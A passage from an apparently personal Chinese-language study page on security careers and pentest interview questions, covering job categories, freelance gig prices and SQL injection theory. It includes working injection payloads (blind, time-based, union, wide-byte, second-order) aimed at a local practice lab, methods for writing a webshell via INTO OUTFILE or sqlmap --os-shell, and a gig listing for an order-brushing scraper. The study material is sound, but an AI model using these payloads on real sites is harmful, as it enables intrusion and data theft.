<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Career: 安全岗位</title>
<meta name="generator" content="Org Mode" />
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<!-- from -->
<!--
<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
-->
<link rel="stylesheet" href="/static/aandds.com/css/main.css">
<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
<!--
<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>

<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
-->
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Career: 安全岗位</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:22642bef-beac-43d9-8f75-f0f8e61df596">工作内容</a></li>
<li><a href="#h:12014852-62fb-41e2-890b-977157ad5bf1">信息安全面试问题总结</a></li>
<li><a href="#h:87f03eba-303d-4e73-8b47-06571aa7b6b5">初级渗透</a>
<ul>
<li><a href="#h:6778f3bd-cc18-4fbd-b6f6-321bfc52c6d2">基础漏洞类型原理及修复方案</a>
<ul>
<li><a href="#h:6d24d52f-110a-4f83-b0e2-c14c0be5fb17">SQL注入</a></li>
<li><a href="#h:a914f1c7-7881-4207-bb3d-d74a54feeee6">XSS(跨站脚本攻击)部分</a></li>
<li><a href="#h:ca475bb0-c381-46a0-9e0c-1fce059fd0e5">CSRF(跨站请求伪造)</a></li>
<li><a href="#h:231a41df-8e0d-4662-8717-680f66edd7f1">SSRF(服务端 请求伪造)部分</a></li>
<li><a href="#h:02320151-06a0-488c-9048-1c87ec042d2e">XML注入（XXE）XML是一种用来传输和存储数据的可扩展标记语言</a></li>
<li><a href="#h:f4e477ce-74a9-4906-8300-5deb2fefdc9b">文件上传部分</a></li>
<li><a href="#h:9850a317-af0b-471e-8538-b067840f597a">文件包含部分</a></li>
<li><a href="#h:23ce296f-8b80-49c1-ae61-7bd1b1bef2bf">会话固定</a></li>
<li><a href="#h:ca1b6476-5737-4302-9a8f-938f71c62cd3">暴力破解</a></li>
<li><a href="#h:1d617823-3710-4f8c-971d-ed878e2331b2">命令注入</a></li>
<li><a href="#h:c651d200-c302-4d47-9be1-b501f6c5d7b3">代码执行</a></li>
<li><a href="#h:0ab9fbd8-b5b9-4621-8c8e-20163e73dbb9">命令执行</a></li>
<li><a href="#h:4cb1e9b0-cf1c-4e1c-b6ca-4cd79093c592">目录遍历</a></li>
<li><a href="#h:aa5cac65-5b9b-4df4-80fd-d349041cd7d3">逻辑漏洞</a></li>
</ul>
</li>
<li><a href="#h:662336cb-6535-4fc0-9cdc-77291aef1944">功能漏洞-带有业务功能场景漏洞</a>
<ul>
<li><a href="#h:4255e400-2b13-4d34-b799-d5cf7e97180e">发送验证码存在哪些漏洞</a></li>
<li><a href="#h:a37fab82-e9df-47ca-8833-bd4fa48c8a2a">支付逻辑漏洞，怎么改价格</a></li>
<li><a href="#h:a887bc46-03fa-4f47-92cf-f0c4ede11598">登录框都可以测哪些漏洞</a></li>
<li><a href="#h:32728842-1e8d-48b4-958a-f8071eddcd56">反序列化</a></li>
</ul>
</li>
<li><a href="#h:a095eff1-4169-4b68-83c9-a46c7c4dad8f">组件漏洞</a>
<ul>
<li><a href="#h:b6a96d93-82f7-463b-bfc0-1f250bcbb084">Apache Log4j2远程代码执行与拒绝服务攻击漏洞（2.0&lt;=2.15.0-rc1）</a></li>
</ul>
</li>
<li><a href="#h:4f2e7a79-3843-46c0-8aad-d119ab5e432b">信息收集</a>
<ul>
<li><a href="#h:20b6fd1f-8190-45f3-a930-31e24b208c0b">Google Hacking 语法</a></li>
</ul>
</li>
<li><a href="#h:bf878827-863b-4a5e-8eca-ddc3abd1d00f">安全工具使用</a>
<ul>
<li><a href="#h:409afbf1-7b5b-4668-a97e-13c44b246e56">一些概念</a>
<ul>
<li><a href="#h:957bb798-8135-4f5b-86d3-973efcee63ff">同源策略</a></li>
<li><a href="#h:4a573f2a-a927-4e7d-b986-6f29f3d4c0d8">Get和Post</a></li>
<li><a href="#h:0a424609-388f-4732-9726-5c58c3186f5b">session与cookie:</a></li>
<li><a href="#h:d591e402-5610-4c78-8fa3-4b90988dce4d">linux 常见命令添加 删除 修改 复制一个文件</a></li>
<li><a href="#h:7fe48bc5-8576-47e2-ae77-ff568408e07d">windows linux 最高权限是什么</a></li>
<li><a href="#h:529d19d4-5c5e-47ff-9ea3-55462c6772ae">整数溢出</a></li>
</ul>
</li>
<li><a href="#h:0fe80fa3-9254-4ec4-a3c3-0063e77885ef">sqlmap使用方法命令</a></li>
<li><a href="#h:62731763-0fd4-43ba-8b15-5bcb7be78d02">如何绕过CDN获取目标网站的真实IP，谈谈你的思路、</a></li>
<li><a href="#h:88b5c5b0-c2ab-4f46-97ab-f1e43cc4088b">子域名查询工具</a></li>
<li><a href="#h:6ebc67d4-dbd3-4264-a492-d24782fc184d">burpSuite</a></li>
<li><a href="#h:dcbcb578-0bad-47d1-9744-8a9a81612e10">解析漏洞</a>
<ul>
<li><a href="#h:7ebeccf3-d3bf-402e-a527-7cebfded3999">IIS 5.X/6.0解析漏洞</a></li>
<li><a href="#h:709576c2-4335-4484-82c8-493237315e11">Apache 解析漏洞</a></li>
<li><a href="#h:f313e32f-f49f-4dc2-a732-57d0e640ed8b">Nginx &lt;8.03 空字节代码执行漏洞</a></li>
</ul>
</li>
<li><a href="#h:e2410949-b804-486d-b906-d3e9c8bced5b">Nmap常用命令</a></li>
<li><a href="#h:28afd22e-d445-4f0c-83c7-d41c8f1faad9">用过哪些扫描工具，区别是什么</a></li>
<li><a href="#h:d8407496-faf0-45df-b848-659902d3d238">获取webshell都有哪些方式</a></li>
<li><a href="#h:fac11c3a-bb68-4521-9fa0-fb60f3354733">加密算法：</a></li>
<li><a href="#h:88d5ab10-814c-411c-8c73-beecfc296bfb">http和https区别</a></li>
<li><a href="#h:5ec5993a-c15b-46a6-b713-d8a9380cb703">https请求过程：</a></li>
<li><a href="#h:5967502d-93c6-4627-bf8b-4452be16c312">http请求过程：</a></li>
<li><a href="#h:58c0e529-8c14-4a69-82cf-6394083580e9">状态码：</a></li>
<li><a href="#h:0e46d619-032d-4474-a77e-8d58433dbc25">三次握手</a></li>
<li><a href="#h:2790a4f8-ca47-4ac8-8242-d190d0fddf1c">为什么是三次，不是两次？四次？</a></li>
<li><a href="#h:fa1148e4-0333-408c-bddc-20ead2dfa54f">四次挥手</a></li>
<li><a href="#h:09f6bf70-2277-4ce9-be9a-b28744a9f1ce">为什么建立连接协议是三次握手，而关闭连接却是四次握手呢</a></li>
<li><a href="#h:834039c6-618b-4e0a-9100-240a3c7c5271">分块传输为什么可以绕过waf</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:906e31f1-05b7-4d52-ba2c-4def8f3ca208">进阶-代码审计及CVE面试</a>
<ul>
<li><a href="#h:9104e8c7-34f3-4e2f-ac40-8bad9aae584a">代码审计</a>
<ul>
<li><a href="#h:e0fc22a3-f9a5-4bf0-9085-10bdd0cf414a">PHP代码审计</a>
<ul>
<li><a href="#h:1bf7b712-b96e-4ba2-85ea-ccd491149c39">thinkphp框架代码审计</a></li>
</ul>
</li>
<li><a href="#h:fb940cda-b2cb-480a-bb5c-fa4b3c236493">JAVA代码审计</a>
<ul>
<li><a href="#h:384a1075-7aac-4923-ac7d-7fae6b26a9d6">SQL注入审计</a></li>
<li><a href="#h:a8df2e75-01f3-4b6c-b9f2-3e3ae432333d">ORM 框架</a></li>
<li><a href="#h:645dceb4-5e7b-48d1-bca2-472a6955e1db">FastJson</a></li>
<li><a href="#h:879c7bac-0394-4335-8442-a5526d555239">注意问题</a></li>
<li><a href="#h:ab3c684c-6d7d-4793-8608-6e4458e591b1">工具-Cobra</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:cf55ab25-3810-4783-9b67-508353ce94e4">DevSecOps</a></li>
<li><a href="#h:52f8e7ad-69c3-4c2d-9ff1-75a0499c4750">绕WAF</a>
<ul>
<li><a href="#h:50505cd2-af8f-450c-a467-8997300a7dd0">SQL注入绕WAF</a></li>
</ul>
</li>
<li><a href="#h:0dc8b4cc-b584-4b6b-8d2a-c6da4bf6dc20">提权</a>
<ul>
<li><a href="#h:ca8b8b1a-6af4-4d0f-ab81-0e8a37a5dee3">windows提权</a>
<ul>
<li><a href="#h:b60721ac-b3a8-4ace-a510-65b03f66f54e">1. 内核溢出漏洞提权</a></li>
<li><a href="#h:2912aa2e-7c95-4841-b387-2524d2f19ca3">2. 数据库提权</a></li>
</ul>
</li>
<li><a href="#h:f77bedab-8d46-4301-bce9-07dda8666d48">linux提权</a>
<ul>
<li><a href="#h:d22b21e4-9452-40ba-903d-0ab217fbbaa5">内核漏洞 脏牛提权（CVE 2016-5195 ）</a></li>
<li><a href="#h:9538c116-849d-4519-9f4d-5a68a7fd805b">SUID提权</a></li>
<li><a href="#h:9953dcba-1a66-4710-8b18-3570493354b7">Linux polkit 本地提权（CVE-2021-4034）</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:1dfafbcb-ca11-4407-a8f2-a21a02e7343d">其他问题汇总</a>
<ul>
<li><a href="#h:9bff7b03-64d1-4200-8bba-62b4b86ee996">渗透思路</a></li>
<li><a href="#h:866429ed-538b-4ede-a4f7-cea7db93c0bc">Apache Log4j2的漏洞</a></li>
<li><a href="#h:97caf4c2-61e3-4ffa-9252-a767fed92437">上传点可能存在哪些漏洞</a></li>
<li><a href="#h:1d1cdca1-fe60-4df7-b955-0d67698befbe">常见的未授权访问漏洞有哪些</a></li>
<li><a href="#h:4534acc8-8847-49c7-9bd3-2e73e0030eca">代码执行，命令执行 函数</a></li>
<li><a href="#h:548480d6-ef2d-4071-9831-9dce7188e1a5">nmap常见参数</a></li>
<li><a href="#h:c1d971b8-df47-40eb-bd8b-323c961476d2">etc/passwd，etc/showdow区别</a></li>
<li><a href="#h:6a11019b-ed69-48d2-8542-aaf02c4c6618">os&#x2013;shell 和 os&#x2013;cmd 区别</a></li>
<li><a href="#h:28092d1b-e8bf-4609-b58e-268b8b836d4e">CRLF 注入漏洞（http拆分）</a></li>
</ul>
</li>
<li><a href="#h:35730b0c-863b-4b39-9392-c4c1ccdb7ffb">应急响应</a>
<ul>
<li><a href="#h:5921524a-563e-4f52-9f7e-5fe732eda2bb">挖矿漏洞如何排查</a>
<ul>
<li><a href="#h:dd19291e-4180-4582-81e7-c9fe19d29309">内存码如何排查</a></li>
<li><a href="#h:a721e3c0-dcb7-49c6-b618-05d96d7e00a4">内网渗透流程</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:38313d20-a4e3-4d43-a62e-4e9e6ef73fb4">框架漏洞</a>
<ul>
<li><a href="#h:9a6ee79f-9092-43cf-b5e3-ff75166f9970">Struts2 RCE 漏洞</a></li>
<li><a href="#h:ff3dfc37-f7bf-4227-965a-8c328a993a52">Shiro 框架漏洞</a>
<ul>
<li><a href="#h:664ae52a-932b-4cbc-b68a-3b8ef731d87f">Apache Shiro反序列化漏洞（Shiro-550  CVE-2016-4437)（Shiro &lt; 1.2.5）</a></li>
<li><a href="#h:ca95d0aa-c6b7-436f-9045-67761515572a">shiro-721</a></li>
<li><a href="#h:9348711e-344e-4582-9b5f-4d16197069b8">权限绕过漏洞（CVE-2020-1957）</a></li>
</ul>
</li>
<li><a href="#h:d25380d9-4643-467a-b0f9-6faa582cc558">Fastjson 反序列化漏洞（是一个 Java 库）</a></li>
<li><a href="#h:6543dd60-2e2b-489c-a496-b19940373dae">thinkphp (RCE漏洞)</a></li>
<li><a href="#h:5726ca2f-3def-4b1a-9188-627df03b2ea2">spring （RCE）</a>
<ul>
<li><a href="#h:b2218517-a3ba-41cb-b8c7-5015e93f88cc">Spring Security OAuth2 远程命令执行（CVE-2016-4977）</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:8fca0df8-d607-442b-a187-b096debe9a94">中间件漏洞</a>
<ul>
<li><a href="#h:c7823978-36d5-4c92-b6f0-03fd28df8936">Tomcat漏洞 (8080/8089)</a>
<ul>
<li><a href="#h:46770303-17a9-45a7-9839-b7732de53c32">Tomcat的PUT方法任意文件上传漏洞(CVE-2017-12615)</a></li>
</ul>
</li>
<li><a href="#h:9f0e11a5-6554-48c3-880f-fd2027a5e659">JBOSS漏洞 (8080/8089)</a>
<ul>
<li><a href="#h:6839721f-cca9-4986-a025-8636b9f35c76">5.x/6.x 反序列化漏洞（CVE-2017-12149）</a></li>
</ul>
</li>
<li><a href="#h:67adaa77-27db-41be-9059-c63e1b2b4a5b">weblogic漏洞 (7001/7002-java反序列化/控制台弱口令)</a>
<ul>
<li><a href="#h:38e709ec-88bd-4241-bb5a-b340a6d3c761">ssrf</a></li>
<li><a href="#h:1af6b6cc-e6d7-4d4d-863d-7c96b83280f7">任意文件读取、口令破解、文件上传</a></li>
<li><a href="#h:96e92414-35b6-4113-9a33-4a4967941243">CVE-2020-14882/14883 远程代码执行(未授权登录)</a></li>
<li><a href="#h:9a2bc45d-8352-4625-91b6-c7c38fb52be9">CVE-2018-2894 任意文件上传</a></li>
<li><a href="#h:aa2f56f8-c541-47b3-b41e-3a374bd77bd7">反序列化命令执行漏洞（CVE-2018-2628）</a></li>
<li><a href="#h:dae52491-2097-4069-a611-1e4039eb447e">XMLDecoder反序列化（CVE-2017–10271）</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:4a315195-1391-4997-a570-cc1418de4d39">服务漏洞</a>
<ul>
<li><a href="#h:a98353ae-d879-4b40-bb28-3c62817f32c6">redis数据库（6379-未授权访问/爆破）</a>
<ul>
<li><a href="#h:06e62b2d-0556-41a5-b301-91a7a0a1da8d">Redis未授权访问写webshell</a></li>
<li><a href="#h:0a65afcb-8f80-4451-8d95-d0850041b984">Redis写入 ssh-keygen 公钥登录</a></li>
<li><a href="#h:c0b79162-648a-489c-b619-3d25da080880">远程主从复制RCE</a></li>
<li><a href="#h:04e7e4b5-4f60-4c1b-903e-f2da5103fa4b">计划任务反弹shell（weblogic SSRF）</a></li>
<li><a href="#h:6346ea3f-873d-4718-98e2-d158b038fbbf">redis防御</a></li>
</ul>
</li>
<li><a href="#h:8e604199-4f6d-4307-b420-6a1232642f68">RDP 远程桌面连接（3389）</a></li>
</ul>
</li>
<li><a href="#h:8fa7b286-71cd-4d71-93ba-11d4ead5abb9">phpmyadmin漏洞</a>
<ul>
<li><a href="#h:cda381a5-dfb8-4aa4-8169-cf4a40dad101">文件包含（CVE-2018-12613）</a></li>
</ul>
</li>
<li><a href="#h:267bc391-c9e6-4a39-bf00-4e47a7887a3f">安全设备</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../../index.html">Career</a></li>
</ul>
<section id="outline-container-h:22642bef-beac-43d9-8f75-f0f8e61df596" class="outline-2">
<h2 id="h:22642bef-beac-43d9-8f75-f0f8e61df596">工作内容</h2>
<div class="outline-text-2" id="text-h:22642bef-beac-43d9-8f75-f0f8e61df596">
<ul class="org-ul">
<li>安全检查</li>
<li>安全工具\开发框架</li>
<li>安全合规</li>
<li>应急响应</li>
<li>安全培训</li>
<li>安全开发流程</li>
</ul>


<p>
初级渗透
</p>

<ul class="org-ul">
<li>基础漏洞类型原理及修复方案</li>
<li>功能漏洞-带有业务功能场景漏洞
<ul class="org-ul">
<li>发送验证码存在哪些漏洞</li>
</ul></li>
<li>组件漏洞
<ul class="org-ul">
<li>fastjson</li>
<li>中间件</li>
</ul></li>
<li>信息收集
<ul class="org-ul">
<li>google hacking</li>
</ul></li>
<li>安全工具使用</li>
</ul>

<p>
项目？
</p>

<p>
进阶
</p>

<ul class="org-ul">
<li>代码审计</li>
</ul>

<p>
总结
</p>
<ol class="org-ol">
<li>所有的基础漏洞原理+修复方案清晰掌握</li>
<li>后渗透、提权、绕过waf、应急</li>
<li>代码审计，java, php</li>
<li>使用自动化工具进行代码审计，会自己搭建</li>
<li>使用python写脚本，爬虫，程序</li>
<li>大部分知名公开漏洞知道大概原理，会利用</li>
<li>把上述所有变成工作项目</li>
</ol>


<p>
<b>安全工作岗位分类</b>
</p>


<figure id="org7493491">
<img src="./images/安全工作岗位分类.png" alt="安全工作岗位分类.png" width="90%">

</figure>

<ul class="org-ul">
<li>A区域-纯技术
<ul class="org-ul">
<li><p>
安全设备管理员、分支机构安全管理员
</p>

<p>
对技术要求不高，只需要管理设备
</p></li>
</ul></li>

<li><p>
C区域
</p>

<p>
技术要求高
</p>

<ul class="org-ul">
<li>创业公司骨干、安全分析、安全研发</li>
</ul></li>

<li><p>
B区域
</p>

<p>
技术要求不高、主要是非技术方面的沟通能力
</p>

<ul class="org-ul">
<li>销售、IT审计组长、安全审计</li>
<li>咨询顾问、IT内控合规、安全管理</li>
<li>企业安全负责人</li>
</ul></li>

<li><p>
D区域
</p>

<p>
技术要求高、沟通管理能力要求高
</p>

<ul class="org-ul">
<li>CRO、法律合规风险管理部门负责人、CIO、CSO</li>
<li>大厂高P/高T</li>
<li>首席架构师、首席研究员</li>
</ul></li>
</ul>

<p>
职业发展建议从C区域做起。
</p>



<p>
<b>安全从业者职业发展路径</b>
</p>


<figure id="org8797ec4">
<img src="./images/安全从业者职业发展路径.png" alt="安全从业者职业发展路径.png" width="100%">

</figure>

<p>
<b>证书</b>
</p>

<p>
cisp 
</p>

<p>
cissp
</p>

<p>
国内最好有个cisp证书
</p>

<p>
<b>简历</b>
</p>

<ul class="org-ul">
<li>技能列表</li>
<li>项目</li>
</ul>

<p>
<b>接单</b>
</p>

<p>
1.挖src漏洞
</p>

<p>
综合性平台：补天、漏洞盒子、CNVD
</p>

<p>
独家SRC：华为、腾讯、360、阿里
</p>

<p>
2.接安全测试委托
</p>

<p>
接单网站
</p>

<p>
python接单
</p>

<ul class="org-ul">
<li>知乎网页数据采集 500</li>
<li>中青网数据抓取 750</li>
<li>爬虫程序采集网站上的数据 300</li>
<li>购物网站刷单爬虫 2000</li>
<li>贴吧网页数据采集 100</li>
<li>爬虫抓取今日头条数据 400</li>
<li>10W行数据表格处理 3000</li>
<li>当当网网站数据抓取 200</li>
<li>淘宝购物车数据采取 100</li>
<li>网站定制 闲鱼数据抓取采集数据分析 400</li>
<li>社交软件信息抓取 200</li>
<li>抓取WINDOWS下监控的应用软件数据 1500</li>
<li>空情网站数据获取开发 300</li>
<li>小蜜蜂app数据采集 100</li>
<li>哈罗摩托数据采集 300</li>
<li>抖音视频抓取 无水印 600</li>
<li>反编译一个python软件取源码 400</li>
</ul>

<p>
例：
</p>

<ul class="org-ul">
<li>制作交互界面 320 1天</li>
<li>抓取个性签名网 100 0.3天</li>
<li>抓取京东-方便面数据 150 3h</li>
<li>抓取淘宝-连衣裙数据 200 0.5天</li>
<li>房价信息获取 180 2h</li>
<li>抓取当当网 230 0.5天</li>
</ul>
<p>
合计 1180 3天
</p>

<p>
3.护网行为HW-红蓝对抗
</p>

<p>
蓝队需要驻场：初、中、高 1-5k/天
</p>

<p>
红队为远程和驻场：6-8k/天
</p>

<p>
4.参加CTF网络安全攻防大赛
</p>
</div>
</section>
<section id="outline-container-h:12014852-62fb-41e2-890b-977157ad5bf1" class="outline-2">
<h2 id="h:12014852-62fb-41e2-890b-977157ad5bf1">信息安全面试问题总结</h2>
<div class="outline-text-2" id="text-h:12014852-62fb-41e2-890b-977157ad5bf1">
<p>
主要内容：
</p>

<ul class="org-ul">
<li>XSS 防御相关</li>
<li>CSRF 相关</li>
<li>XXE 漏洞相关</li>
<li>SQL 注入漏洞相关</li>
<li>CRLF 注入</li>
<li>SSRF</li>
<li>WAF 绕过</li>
<li>浏览器安全</li>
<li>php 安全</li>
<li>java 家族安全</li>
<li>企业安全相关</li>
<li>python</li>
<li>应急响应 or 红蓝对抗</li>
<li>安全开发</li>
<li>认证</li>
</ul>
</div>
</section>
<section id="outline-container-h:87f03eba-303d-4e73-8b47-06571aa7b6b5" class="outline-2">
<h2 id="h:87f03eba-303d-4e73-8b47-06571aa7b6b5">初级渗透</h2>
<div class="outline-text-2" id="text-h:87f03eba-303d-4e73-8b47-06571aa7b6b5">
</div>
<div id="outline-container-h:6778f3bd-cc18-4fbd-b6f6-321bfc52c6d2" class="outline-3">
<h3 id="h:6778f3bd-cc18-4fbd-b6f6-321bfc52c6d2">基础漏洞类型原理及修复方案</h3>
<div class="outline-text-3" id="text-h:6778f3bd-cc18-4fbd-b6f6-321bfc52c6d2">
</div>
<div id="outline-container-h:6d24d52f-110a-4f83-b0e2-c14c0be5fb17" class="outline-4">
<h4 id="h:6d24d52f-110a-4f83-b0e2-c14c0be5fb17">SQL注入</h4>
<div class="outline-text-4" id="text-h:6d24d52f-110a-4f83-b0e2-c14c0be5fb17">
<dl class="org-dl">
<dt>SQL注入原理</dt><dd>没有对用户的输入做严格的过滤和限制，直接把用户的输入拼接到了SQL语句中，并带入数据库执行</dd>

<dt>SQL注入原因</dt><dd><p>
采用字符串拼接的方式构造SQL语句
</p>

<p>
没有对用户输入的参数进行过滤
</p></dd>

<dt>数据库种类</dt><dd><p>
关系型数据库（SQL）：Access   Mysql  Mssql Oracle  Postsql SQLite 
</p>

<p>
非关系型数据库（NO SQL）：Mongodb. redis
</p></dd>

<dt>常见数据库对应的端口</dt><dd><p>
mysql（3306）、sql server（1433）、oracle（1521）、DB2（5000）、postgreSQL（5432）
</p>

<p>
NOSQL数据库： MongoDB（27017）、Redis（6379）
</p></dd>

<dt>Mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</dt><dd>root权限以及网站的绝对路径</dd>

<dt>SQL注入的流程</dt><dd><p>
判断是否存在注入，并判断是字符型还是数字型
</p>

<p>
判断字段长度，回显位置
</p>

<p>
获取数据库信息
</p>

<p>
破解加密数据
</p>

<p>
提升权限/内网渗透
</p></dd>

<dt>常见的网站服务器容器</dt><dd>IIS、Apache、nginx、Lighttpd、Tomcat</dd>

<dt>如何手工快速判断目标站是windows还是linux服务器？</dt><dd><p>
linux大小写敏感,windows大小写不敏感
</p>

<p>
ping命令：一般情况下 linux  TTL&lt;100.   Windows. TTL.&gt;100
</p></dd>

<dt>mysql的网站注入，5.0以上和5.0以下有什么区别</dt><dd><p>
5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名
</p>

<p>
5.0以下是多用户单操作，5.0以上是多用户多操做。
</p></dd>

<dt>SQL注入的种类</dt><dd><dl class="org-dl">
<dt>数据类型 分类:</dt><dd><p>
字符型： <code>http://127.0.0.1/sqli/Less-1/?id=1' #</code> 也可以 <code>?id=1' and'1'</code>'1= 来闭合
</p>

<p>
数字型： <code>http://127.0.0.1/sqli/Less-2/?id=1 and 1=2 --+</code>
</p>

<p>
搜索型：先搜索 单引号,如果出错说明90%存在漏洞;再搜索%，如果正常返回 说明95%有漏洞
</p>

<p>
<code>1%' and 1=1 and '%' ='</code>    <code>1%' and 1=2 and '%' ='</code>
</p></dd>

<dt>提交方式 分类：</dt><dd><p>
GET：提交方式是 GET ,注入点的位置在 GET 参数部分
</p>

<p>
POST： POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中
</p>

<p>
Cookie：HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中
</p>

<p>
HTTP头：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中
</p></dd>

<dt>注入方法 分类：</dt><dd><ul class="org-ul">
<li><p>
布尔盲注：
</p>

<p>
页面没有显示位，没有输出SQL语句执行错误信息，只能通过
页面返回正常不正常来判断是否存在注入，判断and两边的条件是否成立；
利用页面返回不同 逐个猜解数据
</p>

<p>
1' and length(database())=x # 判断数据库长度
</p>

<p>
1' and ascii(substr(database(),1,1))=100 # 判断数据库第一位
</p>

<p>
1' and (select count(table_name)from information_schema.tables where table_schema='dvwa')=2 # 表数量
</p></li>

<li><p>
时间盲注：
</p>

<p>
利用if，sleep，benchmark，笛卡尔积 看页面返回时间是否增加来判断
</p>

<p>
1' and sleep(5) # 判断为字符型
</p>

<p>
1' and if(length(database())=4,sleep(5),1)# 判断数据库长度
</p>

<p>
1' and if(ascii(substr(database(),1,1))=100,sleep(5),1) # 判断数据库第一个字母
</p></li>

<li><p>
报错注入：
</p>

<p>
页面会返回错误信息，且没有显示位，把注入语句的结果直接返回在页面中
</p>

<p>
常用：Extractvalue，updatexml，Floor, exp
</p>

<p>
其他：name_const, join, GeometryCollection, polygon, multipoint, multlinestring, multipolygon, linestring
</p>

<p>
concat：将多个字符串连接成一个字符串
</p>

<p>
count : 查询数量
</p></li>

<li><p>
联合查询注入：
</p>

<p>
union/union all；查询的【列数】和【数据类型】必须相同；页面必须有显示位
</p>

<p>
Union：不包括重复的值；Union all：允许重复的值
</p>

<p>
Goup_concat：把同一列的多行连接到一起，比如：1adminadmin,2gordonbGordon,
</p></li>

<li><p>
堆叠注入：
</p>

<p>
就是一堆 sql 语句(多条)一起执行，在 ; 结束一个sql语句后继续构造下一条语句
</p>

<p>
只有当调用的数据库函数支持执行多条sql语句时才能够使用
</p>

<p>
PHP页面调用sql语句时用的是mysqli_multi_query()函数，才可以使用堆叠注入
</p>

<p>
Mysql和Mssql 才可以用，Oracle直接报错
</p></li>

<li><p>
编码问题（宽字节 二次编码注入）
</p>

<p>
都是在面对PHP代码或配置，对输入（单引号）进行转义的时候，在处理用户输入数据时存在问题，可以绕过转义
</p>

<p>
宽字节注入（GBK编码处理编码的过程存在问题，可构造数据消除反斜杠\）
</p>

<p>
数据库使用了GBK编码，并且使用Addslashes函数在预定义字符 ’”\ null前面添加反斜杠\ ,导致引号闭合失败。由于\的16进制是%5C，所以在前面加上%df就变成%df%5C，变成一个繁体字，可以成功闭合引号
</p>

<p>
GBK编码下使用宽字节注入：%df' and 1=1 &#x2013; + 回显正常   %df' and 1=2 &#x2013; + 回显错误
</p>

<p>
说明存在sql注入，而且是宽字节注入
</p>

<p>
以下为URL编码：
</p>

<p>
%27----&#x2013;&#x2014;单引号   %20-----&#x2013;&#x2014;空格
</p>

<p>
%23------&#x2013;&#x2014;#号    %5c-------&#x2013;&#x2014;\反斜杠
</p>

<p>
addslashes()：返回在预定义字符之前添加反斜杠的字符串
</p>

<ul class="org-ul">
<li><p>
宽字节注入防御
</p>

<p>
①使用mysql_ set_ charset(GBK)指定字符集  ②使用mysql_real _escape_string进行转义
</p></li>

<li><p>
二次注入
</p>

<p>
①插入恶意数据
</p>

<p>
在第一次进行数据库插入数据的时候，仅仅只是使用了addslashes对其中
的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤
后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数
据库的时候还是保留了原来的数据。
</p>

<p>
②引用恶意数据
</p>

<p>
在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次
进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一
步的检验和处理，这样就会造成SQL的二次注入。
</p>

<p>
比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库
中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。
</p>

<p>
<b>二次编码注入（urldecode()与PHP本身处理编码时，两者配合失误，可构造数据消除\）</b>
</p>

<p>
用户输入【1%2527】=&gt;php自身编码，%25转换成%【1%27】=&gt;php未检查到
单引号，不转义【1%27】=&gt;遇到一个函数编码，使代码进行编码转换【1'】
=&gt;带入sql语句=&gt;能注入
</p>

<p>
方法：在注入点后键入%2527，然后按正常的注入流程开始注入
</p></li>
</ul></li>
</ul></dd>

<dt>Sql注入写shell：</dt><dd><p>
1.Into outfile
</p>

<p>
2.Sqlmap   &#x2013;os-shell
</p></dd>

<dt>mysql内置的information_schema数据库中有三个表非常重要</dt><dd><p>
1 schemata:表里包含所有数据库的名字
</p>

<p>
2 tables：表里包含所有数据库的所有的表，默认字段为table_name
</p>

<p>
3 columns:三个列非常重要
</p>

<p>
TABLE_SCHEMA：数据库名 /   TABLE_NAME:表名  /  COLUMN_NAME:字段名
</p></dd>

